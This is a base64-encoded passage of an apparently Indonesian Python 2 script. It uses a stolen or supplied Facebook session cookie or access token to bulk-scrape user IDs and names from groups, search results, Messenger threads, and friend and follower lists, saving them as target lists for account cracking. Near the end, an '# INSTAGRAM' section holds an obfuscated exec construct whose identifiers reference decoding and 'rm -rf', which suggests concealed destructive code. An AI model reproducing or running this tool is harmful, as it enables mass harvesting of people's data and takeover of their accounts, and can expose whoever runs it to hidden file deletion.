zJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBHUk9VUA0KY2xhc3MgZ3JvdXA6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYsIGNvb2tpZXMpOg0KCQlzZWxmLmdsaXN0PVtdDQoJCXNlbGYuY29va2llcz1jb29raWVzDQoJCXNlbGYubWFudWFsKCk7ZXhpdCgpDQoJZGVmIG1hbnVhbChzZWxmKToNCgkJcHJpbnQoIlxuJXMlcyVzIFBlcmx1IGRpIGluZ2F0IGdyb3VwIGhhcnVzIGJlcnNpZmF0IHB1YmxpayBhdGF1IHdhamliIGpvaW4gZ3JvdXAiJShVLHRpbCxPKSkNCgkJaWQ9cmF3X2lucHV0KCIlcyVzJXMgSWQgZ3JvdXBzJXMgPiAlcyIlKFUsdGlsLE8sTSxLKSkNCgkJaWYgaWQgaW4oIiIpOg0KCQkJc2VsZi5tYW51YWwoKQ0KCQllbHNlOg0KCQkJX3JfPWJzNC5CZWF1dGlmdWxTb3VwKHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkLGhlYWRlcnM9aGRjb2soKSxjb29raWVzPXNlbGYuY29va2llcykudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQkJaWYgImtvbnRlbiB0aWRhayIgaW4gX3JfLmZpbmQoInRpdGxlIikudGV4dC5sb3dlcigpOg0KCQkJCWV4aXQoIiVzJXMgaW5wdXQgaWQgZ3J1cCB5ZyB2YWxpZCBnb2Jsb2ssIGlkIGVycm9yLCBhdGF1IGx1IGJlbG9tIGpvb2luIGRpIGdydXAiJShNLHRpbCkpDQoJCQllbHNlOg0KCQkJCXNlbGYubGlzdGVkPXsiaWQiOmlkLCJuYW1lIjpfcl8uZmluZCgidGl0bGUiKS50ZXh0fQ0KCQkJCXNlbGYuZnVja195b3UoKQ0KCQkJCXByaW50KCIlcyVzJXMgTmFtYSBncnVwJXMgPiAlcyVzLi4iJShVLHRpbCxPLE0sSCxzZWxmLmxpc3RlZC5nZXQoIm5hbWUiKVswOjIwXSkpDQoJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2dyb3Vwcy8iK2lkKQ0KCWRlZiBmdWNrX3lvdShzZWxmKToNCgkJc2VsZi5mbD1yYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUgJXM+ICVzJyUoVSx0aWwsTyxNLEspKS5yZXBsYWNlKCIgIiwiXyIpDQoJCWlmIHNlbGYuZmw9PScnOnNlbGYuZnVja195b3UoKQ0KCQlvcGVuKHNlbGYuZmwsInciKS5jbG9zZSgpDQoJZGVmIGR1bXBzKHNlbGYsIHVybCk6DQoJCV9yXz1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9c2VsZi5jb29raWVzLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCQlwcmludCgiXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkICVzPiAlcyVzIFx4MWJbMTs5N20tIG1vaG9uIHR1bmdndVxyIiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNlbGYuZmwpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpDQoJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCgkJZm9yIF9pXyBpbiBfcl8uZmluZF9hbGwoImgzIik6DQoJCQl0cnk6DQoJCQkJaWYgbGVuKGJzNC5yZS5maW5kYWxsKCJcLyIsX2lfLmZpbmQoImEiLGhyZWY9VHJ1ZSkuZ2V0KCJocmVmIikpKT09MToNCgkJCQkJb2dlaD1faV8uZmluZCgiYSIsaHJlZj1UcnVlKQ0KCQkJCQlpZiAicHJvZmlsZS5waHAiIGluIG9nZWguZ2V0KCJocmVmIik6DQoJCQkJCQlfYV89IiIuam9pbihiczQucmUuZmluZGFsbCgicHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLG9nZWguZ2V0KCJocmVmIikpKQ0KCQkJCQkJaWYgbGVuKF9hXyk9PTA6Y29udGludWUNCgkJCQkJCWVsaWYgX2FfIGluIG9wZW4oc2VsZi5mbCkucmVhZCgpOg0KCQkJCQkJCWNvbnRpbnVlDQoJCQkJCQllbHNlOg0KCQkJCQkJCW9wZW4oc2VsZi5mbCwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUoX2FfLG9nZWgudGV4dCkpDQoJCQkJCQkJY29udGludWUNCgkJCQkJZWxzZToNCgkJCQkJCV9hXz0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCIvKC4qPylcPyIsb2dlaC5nZXQoImhyZWYiKSkpDQoJCQkJCQlpZiBsZW4oX2FfKT09MDpjb250aW51ZQ0KCQkJCQkJZWxpZiBfYV8gaW4gb3BlbihzZWxmLmZsKS5yZWFkKCk6DQoJCQkJCQkJY29udGludWUNCgkJCQkJCWVsc2U6DQoJCQkJCQkJb3BlbihzZWxmLmZsLCJhKyIpLndyaXRlKCIlczw9PiVzXG4iJShfYV8sb2dlaC50ZXh0KSkNCgkJCWV4Y2VwdDpjb250aW51ZQ0KCQlmb3IgX2lfIGluIF9yXy5maW5kX2FsbCgiYSIsaHJlZj1UcnVlKToNCgkJCWlmICJMaWhhdCBQb3N0aW5nYW4gTGFpbm55YSIgaW4gX2lfLnRleHQ6DQoJCQkJd2hpbGUgVHJ1ZToNCgkJCQkJdHJ5Og0KCQkJCQkJc2VsZi5kdW1wcygiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIrX2lfLmdldCgiaHJlZiIpKQ0KCQkJCQkJYnJlYWsNCgkJCQkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQkJCQkJcHJpbnQoIlxyXHgxYlsxOzkxbeKAoiVzLCByZXRyeWluZy4uLiIlZSk7Y29udGludWUNCgkJcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBpZCBtZW1iZXIgZ3JvdXAgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNlbGYuZmwpKTtyYXdfaW5wdXQoJ1xuJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKTttZW51KCkNCmRlZiBjZWsoYXJnKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIFRydWUNCgkJZWxzZTpyZXR1cm4gRmFsc2UNCgllbHNlOnJldHVybiBGYWxzZQ0KIyBEVU1QIFBFTkNBUklBTiBOQU1BDQpkZWYgZHVtcGZsKCk6DQogICAgY3ZkcyA9IE5vbmUNCiAgICBjb29raWUgPSBOb25lDQogICAgbmV3ID0gTm9uZQ0KICAgIGlmIGNlaygxKSA9PSBGYWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgY29va2llID0gcmF3X2lucHV0KCJcbiVzJXMlcyBTdXBheWEgYmVrZXJqYSBtYXN1a2FuIGNvb2tpZSBmYWNlYm9vayBhbmRhXG4lcyMgJXNDb29raWUlcyA+ICVzIiUoVSx0aWwsTyxQLE8sTSxLKSkNCiAgICAgICAgICAgIGN2ZHMgPSBjdmQoY29va2llKQ0KICAgICAgICAgICAgbmV3ID0gVHJ1ZQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCgiXHgxYlsxOzkxbeKAoiBpbnZhbGlkIGNvb2tpZSIpO2R1bXBmbCgpDQogICAgZWxzZToNCiAgICAgICAgY3ZkcyA9IGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHAnLCBjb29raWVzPWN2ZHMsIGhlYWRlcnM9aGRjb2soKSkudGV4dA0KICAgIGlmIGxlbihiczQucmUuZmluZGFsbCgnbG9nb3V0JywgcikpICE9IDA6DQogICAgICAgIGlmIGt1ZWgoY3ZkcykgIT0gVHJ1ZToNCiAgICAgICAgICAgIGV4aXQoIiVzJXMgZ2FnYWwgc2FhdCBtZW5kZXRla3NpIGJhaGFzYS4iJShNLHRpbCkpDQogICAgICAgICNwcmludCgiXG4lcyVzJXMgTG9naW4gc2ViYWdhaSVzIFsgJXMlcy4uXSIlKFUsdGlsLE8sTSxILGJzNC5CZWF1dGlmdWxTb3VwKHIsImh0bWwucGFyc2VyIikuZmluZCgidGl0bGUiKS50ZXh0WzA6MTBdKSkNCiAgICAgICAgaWYgbmV3ID09IFRydWU6DQogICAgICAgICAgICBvcGVuKCdkYXRhL2Nvb2tpZXMnLCAndycpLndyaXRlKGNvb2tpZSkNCiAgICAgICAgc2ltPXJhd19pbnB1dCgiXG4lcyVzJXMgTmFtYSBmaWxlICVzPiVzICIlKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgiICIsIl8iKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyBFeGFtcGxlIG5hbWEgb3JhbmcgJXNbICVzUm9taSxnYW50ZW5nICVzXSAiJShVLHRpbCxPLFAsSCxQKSkNCiAgICAgICAgbm1fb3Jhbmc9cmF3X2lucHV0KCIlcyVzJXMgU2V0dCBuYW1hICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgaWYgbm1fb3JhbmcgaW4oInJvbWkiLCJSb21pIiwiUk9NSSIsIlJvbWkgQWZyaXphbCIsIlJvbWkgYWZyaXphbCIsIlJPTUkgQUZSSVpBTCIsInJvbWkgYWZyaXphbCIpOg0KICAgICAgICAJcHJpbnQoIlxuJXMlcyBhbmFrIGFuamluZyBtYXUgY3JhY2sgcGFrZSBuYW1hIGd3ICIlKE0sdGlsKSk7ZXhpdCgpDQogICAgICAgIGVsaWYgbm1fb3JhbmcgaW4oIlJvbWkgR2FudGVuZyIsIlJvbWkgZ2FudGVuZyIsIlJPTUkgR0FOVEVORyIsInJvbWkgZ2FudGVuZyIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgbWVtYW5nIGdhbnRlbmcgZG9uZyBhYmFuZyBSb21pIiUoSCx0aWwpKTtleGl0KCkNCiAgICAgICAgbmFtYWgoc2ltLGN2ZHMsImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZWFyY2gvcGVvcGxlLz9xPSIrbm1fb3JhbmcpDQogICAgZWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3MucmVtb3ZlKCdkYXRhL2Nvb2tpZXMnKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHByaW50ICdceDFiWzE7OTFt4oCiIGxvZ2luIGZhaWwhJw0KICAgICAgICBkdW1wZmwoKQ0KICAgIHJldHVybg0KZGVmIG5hbWFoKHNpbSxyLGIpOg0KCW9wZW4oc2ltLCJhKyIpDQoJYj1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQoYiwgY29va2llcz1yLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWZvciBpIGluIGIuZmluZF9hbGwoImEiLGhyZWY9VHJ1ZSk6DQoJCSNvcy5zeXN0ZW0oImNsZWFyIikNCgkJI2Jhbm5lcigpDQoJCXByaW50KCJcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQgJXM+ICVzJXMgXHgxYlsxOzk3bS0gbW9ob24gdHVuZ2d1IiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNpbSkucmVhZCgpLnNwbGl0bGluZXMoKSkpKSksO3N5cy5zdGRvdXQuZmx1c2goKQ0KCQlpZiAiPGltZyBhbHQ9IiBpbiBzdHIoaSk6DQoJCQlpZiAiaG9tZS5waHAiIGluIHN0cihpWyJocmVmIl0pOg0KCQkJCWNvbnRpbnVlDQoJCQllbHNlOg0KCQkJCWc9c3RyKGlbImhyZWYiXSkNCgkJCQlpZiAicHJvZmlsZS5waHAiIGluIGc6DQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiL3Byb2ZpbGVcLnBocFw/aWQ9KC4qPykmIixnKQ0KCQkJCQlpZiBsZW4gKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCQkJZWxzZToNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiLyguKj8pXD8iLGcpDQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJaWYgbGVuKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCWlmICJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIgaW4gaS50ZXh0Og0KCQkJbmFtYWgoc2ltLHIsaVsiaHJlZiJdKQ0KCXByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcGVuY2FyaWFuIG5hbWEgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNpbSkpO3Jhd19pbnB1dCgnXG4lcyVzJXMgWyVzIEVudGVyJXMgXSAnJShVLHRpbCxPLFUsTykpO21lbnUoKQ0KIyBEVU1QIFBFU0FODQpjbGFzcyBwZXNhbjoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb29raWVzKToNCiAgICAgICAgc2VsZi5jb29raWVzID0gY29va2llcw0KICAgICAgICAjX19yb216X18oKQ0KICAgICAgICAjb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIHNlbGYuZiA9IHJhd19pbnB1dCgnXG4lcyVzJXMgTmFtYSBmaWxlJXMgPiVzICclKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgaWYgc2VsZi5mID09ICcnOg0KICAgICAgICAgICAgcGVzYW4oY29va2llcykNCiAgICAgICAgb3BlbihzZWxmLmYsICd3JykuY2xvc2UoKQ0KICAgICAgICBzZWxmLmR1bXAoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9tZXNzYWdlcycpDQogICAgZGVmIGR1bXAoc2VsZix1cmwpOg0KICAgIAlvcGVuKHNlbGYuZiwgJ2ErJykNCiAgICAgICAgYnMgPSBiczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhkY29rKCksIGNvb2tpZXM9c2VsZi5jb29raWVzKS50ZXh0LCAnaHRtbC5wYXJzZXInKQ0KICAgICAgICBwcmludCAoIlxyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCAlcz4gJXMlcyBceDFiWzE7OTdtLSBtb2hvbiB0dW5nZ3VcciIlKFUsdGlsLE8sTSxILHN0cihsZW4ob3BlbihzZWxmLmYpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpO3N5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCiAgICAgICAgZm9yIGkgaW4gYnMuZmluZF9hbGwoJ2EnLCBocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgJy9tZXNzYWdlcy9yZWFkJyBpbiBpLmdldCgnaHJlZicpOg0KICAgICAgICAgICAgICAgIGYgPSBiczQucmUuZmluZGFsbCgnY2lkXFwuY1xcLiguKj8pJTNBKC4qPykmJywgaS5nZXQoJ2hyZWYnKSkNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGZvciBpcCBpbiBsaXN0KGYucG9wKCkpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5jb29raWVzLmdldCgnIGNfdXNlcicpIGluIGlwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdwZW5nZ3VuYSBmYWNlYm9vaycgaW4gaS50ZXh0Lmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlbihzZWxmLmYsICdhKycpLndyaXRlKCclczw9PiVzXG4nICUgKGlwLCBpLnRleHQpKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGlmICdMaWhhdCBQZXNhbiBTZWJlbHVtbnlhJyBpbiBpLnRleHQ6DQogICAgICAgICAgICAgICAgc2VsZi5kdW1wKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vJyArIGkuZ2V0KCdocmVmJykpDQogICAgICAgIHByaW50ICgnXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIHBlc2FuIG1lc2VuZ2dlciAnJShILHRpbCkpDQogICAgICAgIHByaW50ICgnJXMlcyVzIEZpbGUgZHVtcCB0ZXJzaW1wYW4gJXM+JXMgJXMgJyUoVSx0aWwsTyxNLEgsc2VsZi5mKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQojIERVTVAgSUQgRkFDRUJPT0sNCmNsYXNzIGR1bXBfaWQ6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYpOg0KCQlzZWxmLmZiID0gW10NCgkJc2VsZi5yb20gPSBbXQ0KCQkNCglkZWYgcGlsaWhhbihzZWxmKToNCgkJcHJpbnQgKCdcbiVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCgkJcHJpbnQgKCclc+KAoiVzIDAyICVzRHVtcCBpZCBmb2xsb3dlcnMnJShVLFAsTykpDQoJCXByaW50ICgnJXPigKIlcyAwMCAlc0tlbWJhbGknJShVLE0sTykpDQoJCXIgPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQoJCWlmIHIgaW5bJyddOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO3NlbGYucGlsaWhhbigpDQoJCWVsaWYgciBpblsnMScsJzAxJ106DQoJCQlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBkYWZ0YXIgdGVtYW4gc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQoJCQlkdW0gPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCQkJbGltID0gcmF3X2lucHV0KCclcyVzICVzTWF4aW1hbCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlpZiBkdW0gPT0gJyc6DQoJCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KCQkJdHJ5Og0KCQkJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJCQkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnICUgKGR1bSwgcm9teikpDQoJCQkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCQkJcHJpbnQgJycNCgkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCXByaW50ICclc+KAoiBJZCB0aWRhayBwdWJsaWsnJShNKTtleGl0KCkNCgkJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2ZyaWVuZHM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMnICUgKGlkLCByb216KSkNCgkJCQkJbyA9IGpzb24ubG9hZHMobS50ZXh0KQ0KCQkJCQl0cnk6DQoJCQkJCQlmb3IgdSBpbiBvWydkYXRhJ106DQoJCQkJCQkJc2VsZi5yb20uYXBwZW5kKHVbJ2lkJ10pDQoJCQkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCQkJcHJpbnQgJyVz4oCiIHRlbWFuIHByaXZhdGUnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycyJywnMDInXToNCgkJCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGZvbGxvd2VycyBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCgkJCWR1bSA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlsaW0gPSByYXdfaW5wdXQoJyVzJXMgJXNNYXhpbWFsIGlkJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCgkJCWlmIGR1bSA9PSAnJzoNCgkJCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7ZXhpdCgpDQoJCQl0cnk6DQoJCQkJcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3InKS5yZWFkKCkNCgkJCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcycgJSAoZHVtLCByb216KSkNCgkJCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJCQlwcmludCAnJw0KCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJcHJpbnQgJyVz4oCiIGlkIHRpZGFrIGFkYSclKE0pO2V4aXQoKQ0KCQkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyAlIChpZCwgcm9teikpDQoJCQkJCW8gPSBqc29uLmxvYWRzKG0udGV4dCkNCgkJCQkJdHJ5Og0KCQkJCQkJZm9yIHUgaW4gb1snZGF0YSddOg0KCQkJCQkJCXNlbGYucm9tLmFwcGVuZCh1WydpZCddKQ0KCQkJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCQkJCXByaW50ICclc+KAoiB0aWRhayBhZGEgcGVuZ2lrdXQnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KIyBJTlNUQUdSQU0NCmV4ZWNfX19faW1wb3J0X21hcnNoYWxfemxpYl9iYXNlNjRfYmFzZTMyX2RlY29kZV9fX19leGVjID0gX19leGVjX19fK19fX19leGVjX19fYmFzZTY0X2RlY29kZV9fXytfX19fX2V4ZWNfX19kZWNvZGVfcHljb20rX19fX19fX19fX19fX19fX19fX19fX19fX19fXw0KX19fZXhlY19zdHJfX19fX19fX19fX19fbGFtYmRhX19fX19fX19fX19fX29zX3N5c19ybV9yZl9fX19fX19fX19fX18gPSBfX19fX19fX19fX19fX2lfX19fX19fX19fX19fXytfX19fX19fX2V4ZWNfbGFtYmRhX19fX19fX18NCg0KIyBoYWR1aA0KZGVmIGlnZygpOg0KCV9fX19fZXhlY19sYW1iZGFfX19fXyhleGVjX19fX2ltcG9ydF9tYXJzaGFsX3psaWJfYmFzZTY0X2Jhc2UzMl9kZWNvZGVfX19fZXhlYytfX19leGVjX3N0cl9fX19fX19fX19fX19sYW1iZGFfX19fX19fX19fX19fb3Nfc3lzX3JtX3JmX19fX19fX19fX19fXykNCglfX19fX2V4ZWNfbGFtYmRhX19fX18oRXh4eF9fX19fX19fX19fX19fX19fX19fX19vc19zeXNfX3JtX3JmX2NfX19fX19fX3N0cl9pX3NvX19fX19fX19leF9sYW1iZGEpDQoNCiMgVVNFUiBBR0VOVA0KZGVmIHVzZXJfYWdlbnRBUEkoKToNCgl1Z2VudCA9Ww0KCSAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLA0KCSAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwNCgkgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjEuMjsgTm9raWFfWCBCdWlsZC9KWk81NEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yNy4wLjg3LjkwIE1vYm